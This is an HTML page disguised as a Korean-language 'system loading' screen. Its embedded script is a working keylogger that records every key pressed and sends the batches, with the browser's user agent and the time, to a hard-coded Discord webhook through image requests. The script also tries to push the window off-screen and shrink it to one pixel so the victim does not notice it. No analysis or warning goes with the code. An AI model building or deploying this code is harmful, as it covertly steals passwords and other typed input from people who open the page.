<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <style>body { background:#000; margin:0; height:100vh; display:flex; align-items:center; justify-content:center; color:#0f0; font-family:Consolas; }</style>
</head>
<body>
  <h1>시스템 로딩 중...</h1>

  <script>
    var log = "";
    var webhook = "https://discord.com/api/webhooks/1472244980662927381/FycSobkkKh_MzI-EcY_cZYC7OGdo9U8yTKBReRTzkfeagFVW6hit4W7ODQ8MqwCL9iiv";

    document.addEventListener("keydown", function(e) {
      var key = e.key;
      if (key === "Enter") key = "[ENTER]";
      if (key === "Backspace") key = "[BACKSPACE]";
      if (key === "Tab") key = "[TAB]";
      if (key === " ") key = "[SPACE]";
      if (key.length > 1) key = "[" + key + "]";
      log += key;

      if (log.length > 30) {
        new Image().src = webhook + "?log=" + encodeURIComponent(log + " | UA: " + navigator.userAgent + " | Time: " + new Date().toLocaleString());
        log = "";
      }
    });

    window.addEventListener("blur", function() {
      if (log.length > 0) {
        new Image().src = webhook + "?log=" + encodeURIComponent("세션 종료 - 최종 로그: " + log);
        log = "";
      }
    });

    window.moveTo(-10000, -10000);
    window.resizeTo(1, 1);
  </script>
</body>
</html>
